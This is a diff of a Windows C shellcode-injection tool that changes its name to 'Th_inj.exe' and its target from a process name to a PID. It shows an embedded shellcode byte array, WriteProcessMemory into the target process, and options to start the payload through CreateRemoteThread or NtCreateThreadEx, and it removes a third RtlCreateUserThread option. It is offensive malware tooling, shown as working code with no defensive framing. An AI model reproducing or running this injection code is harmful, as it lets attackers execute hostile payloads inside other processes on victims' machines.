@@ -1,8 +1,6 @@
 #include<stdio.h>
 #include<Windows.h>
-#include<psapi.h>
 
-#include "stdafx.h"
 #pragma comment (linker, "/defaultlib:ntdll.lib")
 
 
@@ -43,6 +41,7 @@ unsigned char sc[] = "\xdb\xd9\xbe\x95\x2c\x95\x21\xd9\x74\x24\xf4\x5f\x29\xc9\x
 "\x9e\xd0\x7c\x48\x42\x39\x1b\xe8\xe1\x45";
 
 #endif
+//this i kept only for 32-bit,x64 could just be added from here.
 typedef struct _CLIENT_ID {
 	HANDLE UniqueProcess;
 	HANDLE UniqueThread;
@@ -85,7 +84,7 @@ int wmain(int argc, wchar_t **argv)
 	}
 	if (argc != 3)
 	{
-		printf("Usage: SimpleThreadInjection.exe [process name] [option number]\noption 1 - CreateRemoteThread\noption 2 - NtCreateThreadEx\noption 3 - RtlCreateUserThread\n");
+		printf("Usage:Th_inj.exe [PID] [option number]\noption 1 - CreateRemoteThread\noption 2 - NtCreateThreadEx\n");
 		return -1;
 	}
 	int option = _wtoi(argv[2]);
@@ -109,7 +108,7 @@ int wmain(int argc, wchar_t **argv)
 	BOOL wr = WriteProcessMemory(hprocess,lpbaseaddress,(LPVOID)sc,sizeof(sc),lpbyteswritten);
 	
 	
-	printf("Shellcode is written to memory of target process\n");
+	printf("Shellcode is written to memory of target PID\n");
 	//start remote thread in target process
 	HANDLE hthread = NULL;
 	DWORD threadid = 0;
@@ -152,8 +151,6 @@ int wmain(int argc, wchar_t **argv)
 
 	
 }
-
-	printf("Successfully injected shellcode in the target PID\n");
-
-	return 0;
+printf("Successfully injected shellcode in the target PID\n");
+return 0;
 }
